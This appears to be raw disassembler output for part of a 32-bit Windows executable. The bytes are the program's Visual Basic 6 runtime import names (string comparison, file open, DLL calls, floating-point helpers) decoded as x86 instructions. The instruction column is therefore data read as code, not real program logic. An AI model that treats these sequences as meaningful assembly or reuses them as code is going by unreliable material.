  403d60:	5f                   	pop    %edi
  403d61:	41                   	inc    %ecx
  403d62:	64 64 52             	fs fs push %edx
  403d65:	65 66 00 00          	data16 add %al,%gs:(%eax)
  403d69:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d6c:	76 62                	jbe    0x403dd0
  403d6e:	61                   	popa
  403d6f:	47                   	inc    %edi
  403d70:	65 6e                	outsb  %gs:(%esi),(%dx)
  403d72:	65 72 61             	gs jb  0x403dd6
  403d75:	74 65                	je     0x403ddc
  403d77:	42                   	inc    %edx
  403d78:	6f                   	outsl  %ds:(%esi),(%dx)
  403d79:	75 6e                	jne    0x403de9
  403d7b:	64 73 45             	fs jae 0x403dc3
  403d7e:	72 72                	jb     0x403df2
  403d80:	6f                   	outsl  %ds:(%esi),(%dx)
  403d81:	72 00                	jb     0x403d83
  403d83:	00 00                	add    %al,(%eax)
  403d85:	00 5f 5f             	add    %bl,0x5f(%edi)
  403d88:	76 62                	jbe    0x403dec
  403d8a:	61                   	popa
  403d8b:	53                   	push   %ebx
  403d8c:	74 72                	je     0x403e00
  403d8e:	43                   	inc    %ebx
  403d8f:	6d                   	insl   (%dx),%es:(%edi)
  403d90:	70 00                	jo     0x403d92
  403d92:	00 00                	add    %al,(%eax)
  403d94:	5f                   	pop    %edi
  403d95:	5f                   	pop    %edi
  403d96:	76 62                	jbe    0x403dfa
  403d98:	61                   	popa
  403d99:	50                   	push   %eax
  403d9a:	75 74                	jne    0x403e10
  403d9c:	4f                   	dec    %edi
  403d9d:	77 6e                	ja     0x403e0d
  403d9f:	65 72 33             	gs jb  0x403dd5
  403da2:	00 00                	add    %al,(%eax)
  403da4:	00 00                	add    %al,(%eax)
  403da6:	5f                   	pop    %edi
  403da7:	5f                   	pop    %edi
  403da8:	76 62                	jbe    0x403e0c
  403daa:	61                   	popa
  403dab:	56                   	push   %esi
  403dac:	61                   	popa
  403dad:	72 54                	jb     0x403e03
  403daf:	73 74                	jae    0x403e25
  403db1:	45                   	inc    %ebp
  403db2:	71 00                	jno    0x403db4
  403db4:	00 00                	add    %al,(%eax)
  403db6:	5f                   	pop    %edi
  403db7:	5f                   	pop    %edi
  403db8:	76 62                	jbe    0x403e1c
  403dba:	61                   	popa
  403dbb:	49                   	dec    %ecx
  403dbc:	32 49 34             	xor    0x34(%ecx),%cl
  403dbf:	00 00                	add    %al,(%eax)
  403dc1:	00 44 6c 6c          	add    %al,0x6c(%esp,%ebp,2)
  403dc5:	46                   	inc    %esi
  403dc6:	75 6e                	jne    0x403e36
  403dc8:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  403dcc:	6e                   	outsb  %ds:(%esi),(%dx)
  403dcd:	43                   	inc    %ebx
  403dce:	61                   	popa
  403dcf:	6c                   	insb   (%dx),%es:(%edi)
  403dd0:	6c                   	insb   (%dx),%es:(%edi)
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	00 5f 5f             	add    %bl,0x5f(%edi)
  403dd6:	76 62                	jbe    0x403e3a
  403dd8:	61                   	popa
  403dd9:	52                   	push   %edx
  403dda:	65 64 69 6d 50 72 65 	gs imul $0x65736572,%fs:0x50(%ebp),%ebp
  403de1:	73 65 
  403de3:	72 76                	jb     0x403e5b
  403de5:	65 00 00             	add    %al,%gs:(%eax)
  403de8:	00 00                	add    %al,(%eax)
  403dea:	5f                   	pop    %edi
  403deb:	61                   	popa
  403dec:	64 6a 5f             	fs push $0x5f
  403def:	66 70 61             	data16 jo 0x403e53
  403df2:	74 61                	je     0x403e55
  403df4:	6e                   	outsb  %ds:(%esi),(%dx)
  403df5:	00 00                	add    %al,(%eax)
  403df7:	00 5f 5f             	add    %bl,0x5f(%edi)
  403dfa:	76 62                	jbe    0x403e5e
  403dfc:	61                   	popa
  403dfd:	46                   	inc    %esi
  403dfe:	69 78 73 74 72 43 6f 	imul   $0x6f437274,0x73(%eax),%edi
  403e05:	6e                   	outsb  %ds:(%esi),(%dx)
  403e06:	73 74                	jae    0x403e7c
  403e08:	72 75                	jb     0x403e7f
  403e0a:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  403e0e:	00 00                	add    %al,(%eax)
  403e10:	5f                   	pop    %edi
  403e11:	5f                   	pop    %edi
  403e12:	76 62                	jbe    0x403e76
  403e14:	61                   	popa
  403e15:	52                   	push   %edx
  403e16:	65 64 69 6d 00 00 00 	gs imul $0x45000000,%fs:0x0(%ebp),%ebp
  403e1d:	00 45 
  403e1f:	56                   	push   %esi
  403e20:	45                   	inc    %ebp
  403e21:	4e                   	dec    %esi
  403e22:	54                   	push   %esp
  403e23:	5f                   	pop    %edi
  403e24:	53                   	push   %ebx
  403e25:	49                   	dec    %ecx
  403e26:	4e                   	dec    %esi
  403e27:	4b                   	dec    %ebx
  403e28:	5f                   	pop    %edi
  403e29:	52                   	push   %edx
  403e2a:	65 6c                	gs insb (%dx),%es:(%edi)
  403e2c:	65 61                	gs popa
  403e2e:	73 65                	jae    0x403e95
  403e30:	00 00                	add    %al,(%eax)
  403e32:	00 00                	add    %al,(%eax)
  403e34:	5f                   	pop    %edi
  403e35:	43                   	inc    %ebx
  403e36:	49                   	dec    %ecx
  403e37:	73 71                	jae    0x403eaa
  403e39:	72 74                	jb     0x403eaf
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	00 45 56             	add    %al,0x56(%ebp)
  403e40:	45                   	inc    %ebp
  403e41:	4e                   	dec    %esi
  403e42:	54                   	push   %esp
  403e43:	5f                   	pop    %edi
  403e44:	53                   	push   %ebx
  403e45:	49                   	dec    %ecx
  403e46:	4e                   	dec    %esi
  403e47:	4b                   	dec    %ebx
  403e48:	5f                   	pop    %edi
  403e49:	51                   	push   %ecx
  403e4a:	75 65                	jne    0x403eb1
  403e4c:	72 79                	jb     0x403ec7
  403e4e:	49                   	dec    %ecx
  403e4f:	6e                   	outsb  %ds:(%esi),(%dx)
  403e50:	74 65                	je     0x403eb7
  403e52:	72 66                	jb     0x403eba
  403e54:	61                   	popa
  403e55:	63 65 00             	arpl   %esp,0x0(%ebp)
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	5f                   	pop    %edi
  403e5b:	5f                   	pop    %edi
  403e5c:	76 62                	jbe    0x403ec0
  403e5e:	61                   	popa
  403e5f:	45                   	inc    %ebp
  403e60:	78 63                	js     0x403ec5
  403e62:	65 70 74             	gs jo  0x403ed9
  403e65:	48                   	dec    %eax
  403e66:	61                   	popa
  403e67:	6e                   	outsb  %ds:(%esi),(%dx)
  403e68:	64 6c                	fs insb (%dx),%es:(%edi)
  403e6a:	65 72 00             	gs jb  0x403e6d
  403e6d:	00 00                	add    %al,(%eax)
  403e6f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403e72:	76 62                	jbe    0x403ed6
  403e74:	61                   	popa
  403e75:	53                   	push   %ebx
  403e76:	74 72                	je     0x403eea
  403e78:	54                   	push   %esp
  403e79:	6f                   	outsl  %ds:(%esi),(%dx)
  403e7a:	55                   	push   %ebp
  403e7b:	6e                   	outsb  %ds:(%esi),(%dx)
  403e7c:	69 63 6f 64 65 00 00 	imul   $0x6564,0x6f(%ebx),%esp
  403e83:	00 5f 61             	add    %bl,0x61(%edi)
  403e86:	64 6a 5f             	fs push $0x5f
  403e89:	66 70 72             	data16 jo 0x403efe
  403e8c:	65 6d                	gs insl (%dx),%es:(%edi)
  403e8e:	00 00                	add    %al,(%eax)
  403e90:	00 00                	add    %al,(%eax)
  403e92:	5f                   	pop    %edi
  403e93:	61                   	popa
  403e94:	64 6a 5f             	fs push $0x5f
  403e97:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  403e9e:	36 34 00             	ss xor $0x0,%al
  403ea1:	00 00                	add    %al,(%eax)
  403ea3:	00 5f 5f             	add    %bl,0x5f(%edi)
  403ea6:	76 62                	jbe    0x403f0a
  403ea8:	61                   	popa
  403ea9:	46                   	inc    %esi
  403eaa:	50                   	push   %eax
  403eab:	45                   	inc    %ebp
  403eac:	78 63                	js     0x403f11
  403eae:	65 70 74             	gs jo  0x403f25
  403eb1:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  403eb8:	5f                   	pop    %edi
  403eb9:	5f                   	pop    %edi
  403eba:	76 62                	jbe    0x403f1e
  403ebc:	61                   	popa
  403ebd:	49                   	dec    %ecx
  403ebe:	6e                   	outsb  %ds:(%esi),(%dx)
  403ebf:	53                   	push   %ebx
  403ec0:	74 72                	je     0x403f34
  403ec2:	56                   	push   %esi
  403ec3:	61                   	popa
  403ec4:	72 00                	jb     0x403ec6
  403ec6:	00 00                	add    %al,(%eax)
  403ec8:	5f                   	pop    %edi
  403ec9:	5f                   	pop    %edi
  403eca:	76 62                	jbe    0x403f2e
  403ecc:	61                   	popa
  403ecd:	47                   	inc    %edi
  403ece:	65 74 4f             	gs je  0x403f20
  403ed1:	77 6e                	ja     0x403f41
  403ed3:	65 72 33             	gs jb  0x403f09
  403ed6:	00 00                	add    %al,(%eax)
  403ed8:	00 00                	add    %al,(%eax)
  403eda:	5f                   	pop    %edi
  403edb:	5f                   	pop    %edi
  403edc:	76 62                	jbe    0x403f40
  403ede:	61                   	popa
  403edf:	55                   	push   %ebp
  403ee0:	62 6f 75             	bound  %ebp,0x75(%edi)
  403ee3:	6e                   	outsb  %ds:(%esi),(%dx)
  403ee4:	64 00 00             	add    %al,%fs:(%eax)
  403ee7:	00 5f 5f             	add    %bl,0x5f(%edi)
  403eea:	76 62                	jbe    0x403f4e
  403eec:	61                   	popa
  403eed:	53                   	push   %ebx
  403eee:	74 72                	je     0x403f62
  403ef0:	56                   	push   %esi
  403ef1:	61                   	popa
  403ef2:	72 56                	jb     0x403f4a
  403ef4:	61                   	popa
  403ef5:	6c                   	insb   (%dx),%es:(%edi)
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	00 00                	add    %al,(%eax)
  403efa:	5f                   	pop    %edi
  403efb:	5f                   	pop    %edi
  403efc:	76 62                	jbe    0x403f60
  403efe:	61                   	popa
  403eff:	56                   	push   %esi
  403f00:	61                   	popa
  403f01:	72 43                	jb     0x403f46
  403f03:	61                   	popa
  403f04:	74 00                	je     0x403f06
  403f06:	00 00                	add    %al,(%eax)
  403f08:	5f                   	pop    %edi
  403f09:	43                   	inc    %ebx
  403f0a:	49                   	dec    %ecx
  403f0b:	6c                   	insb   (%dx),%es:(%edi)
  403f0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0d:	67 00 00             	add    %al,(%bx,%si)
  403f10:	00 00                	add    %al,(%eax)
  403f12:	5f                   	pop    %edi
  403f13:	5f                   	pop    %edi
  403f14:	76 62                	jbe    0x403f78
  403f16:	61                   	popa
  403f17:	45                   	inc    %ebp
  403f18:	72 72                	jb     0x403f8c
  403f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f1b:	72 4f                	jb     0x403f6c
  403f1d:	76 65                	jbe    0x403f84
  403f1f:	72 66                	jb     0x403f87
  403f21:	6c                   	insb   (%dx),%es:(%edi)
  403f22:	6f                   	outsl  %ds:(%esi),(%dx)
  403f23:	77 00                	ja     0x403f25
  403f25:	00 00                	add    %al,(%eax)
  403f27:	00 5f 5f             	add    %bl,0x5f(%edi)
  403f2a:	76 62                	jbe    0x403f8e
  403f2c:	61                   	popa
  403f2d:	46                   	inc    %esi
  403f2e:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  403f35:	00 
  403f36:	00 00                	add    %al,(%eax)
  403f38:	5f                   	pop    %edi
  403f39:	5f                   	pop    %edi
  403f3a:	76 62                	jbe    0x403f9e
  403f3c:	61                   	popa
  403f3d:	4e                   	dec    %esi
  403f3e:	65 77 32             	gs ja  0x403f73
  403f41:	00 00                	add    %al,(%eax)
  403f43:	00 5f 61             	add    %bl,0x61(%edi)
  403f46:	64 6a 5f             	fs push $0x5f
  403f49:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  403f50:	32 69 00             	xor    0x0(%ecx),%ch
  403f53:	00 00                	add    %al,(%eax)
  403f55:	00 5f 61             	add    %bl,0x61(%edi)
  403f58:	64 6a 5f             	fs push $0x5f
  403f5b:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  403f62:	33 32                	xor    (%edx),%esi
  403f64:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  403f6a:	76 62                	jbe    0x403fce
  403f6c:	61                   	popa
  403f6d:	53                   	push   %ebx
  403f6e:	74 72                	je     0x403fe2
  403f70:	43                   	inc    %ebx
  403f71:	6f                   	outsl  %ds:(%esi),(%dx)
  403f72:	70 79                	jo     0x403fed
  403f74:	00 00                	add    %al,(%eax)
  403f76:	00 00                	add    %al,(%eax)
  403f78:	5f                   	pop    %edi
  403f79:	5f                   	pop    %edi
  403f7a:	76 62                	jbe    0x403fde
  403f7c:	61                   	popa
  403f7d:	46                   	inc    %esi
  403f7e:	72 65                	jb     0x403fe5
  403f80:	65 53                	gs push %ebx
  403f82:	74 72                	je     0x403ff6
  403f84:	4c                   	dec    %esp
  403f85:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  403f8c:	5f                   	pop    %edi
  403f8d:	61                   	popa
  403f8e:	64 6a 5f             	fs push $0x5f
  403f91:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  403f98:	33 32                	xor    (%edx),%esi
  403f9a:	00 00                	add    %al,(%eax)
  403f9c:	00 00                	add    %al,(%eax)
  403f9e:	5f                   	pop    %edi
  403f9f:	61                   	popa
  403fa0:	64 6a 5f             	fs push $0x5f
  403fa3:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  403faa:	00 00                	add    %al,(%eax)
  403fac:	5f                   	pop    %edi
  403fad:	5f                   	pop    %edi
  403fae:	76 62                	jbe    0x404012
  403fb0:	61                   	popa
  403fb1:	56                   	push   %esi
  403fb2:	61                   	popa
  403fb3:	72 54                	jb     0x404009
  403fb5:	73 74                	jae    0x40402b
  403fb7:	4e                   	dec    %esi
  403fb8:	65 00 00             	add    %al,%gs:(%eax)
  403fbb:	00 5f 5f             	add    %bl,0x5f(%edi)
  403fbe:	76 62                	jbe    0x404022
  403fc0:	61                   	popa
  403fc1:	53                   	push   %ebx
  403fc2:	74 72                	je     0x404036
  403fc4:	54                   	push   %esp
  403fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc6:	41                   	inc    %ecx
  403fc7:	6e                   	outsb  %ds:(%esi),(%dx)
  403fc8:	73 69                	jae    0x404033
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	00 00                	add    %al,(%eax)
  403fce:	5f                   	pop    %edi
  403fcf:	43                   	inc    %ebx
  403fd0:	49                   	dec    %ecx
  403fd1:	61                   	popa
  403fd2:	74 61                	je     0x404035
  403fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 5f 5f             	add    %bl,0x5f(%edi)
  403fda:	76 62                	jbe    0x40403e
  403fdc:	61                   	popa
  403fdd:	53                   	push   %ebx
  403fde:	74 72                	je     0x404052
  403fe0:	4d                   	dec    %ebp
  403fe1:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe2:	76 65                	jbe    0x404049
  403fe4:	00 00                	add    %al,(%eax)
  403fe6:	00 00                	add    %al,(%eax)
  403fe8:	5f                   	pop    %edi
  403fe9:	61                   	popa
  403fea:	6c                   	insb   (%dx),%es:(%edi)
  403feb:	6c                   	insb   (%dx),%es:(%edi)
  403fec:	6d                   	insl   (%dx),%es:(%edi)
  403fed:	75 6c                	jne    0x40405b
  403fef:	00 00                	add    %al,(%eax)
  403ff1:	00 5f 43             	add    %bl,0x43(%edi)
  403ff4:	49                   	dec    %ecx
  403ff5:	74 61                	je     0x404058
  403ff7:	6e                   	outsb  %ds:(%esi),(%dx)
  403ff8:	00 00                	add    %al,(%eax)
  403ffa:	00 00                	add    %al,(%eax)
  403ffc:	5f                   	pop    %edi
  403ffd:	43                   	inc    %ebx
  403ffe:	49                   	dec    %ecx
  403fff:	65 78 70             	gs js  0x404072
  404002:	00 00                	add    %al,(%eax)
  404004:	00 00                	add    %al,(%eax)
  404006:	5f                   	pop    %edi
  404007:	5f                   	pop    %edi
  404008:	76 62                	jbe    0x40406c
  40400a:	61                   	popa
  40400b:	46                   	inc    %esi
  40400c:	72 65                	jb     0x404073
  40400e:	65 53                	gs push %ebx
  404010:	74 72                	je     0x404084
  404012:	00 00                	add    %al,(%eax)
  404014:	00 00                	add    %al,(%eax)
  404016:	5f                   	pop    %edi
  404017:	5f                   	pop    %edi
  404018:	76 62                	jbe    0x40407c
  40401a:	61                   	popa
  40401b:	46                   	inc    %esi
  40401c:	72 65                	jb     0x404083
  40401e:	65 4f                	gs dec %edi
  404020:	62 6a 00             	bound  %ebp,0x0(%edx)
	...
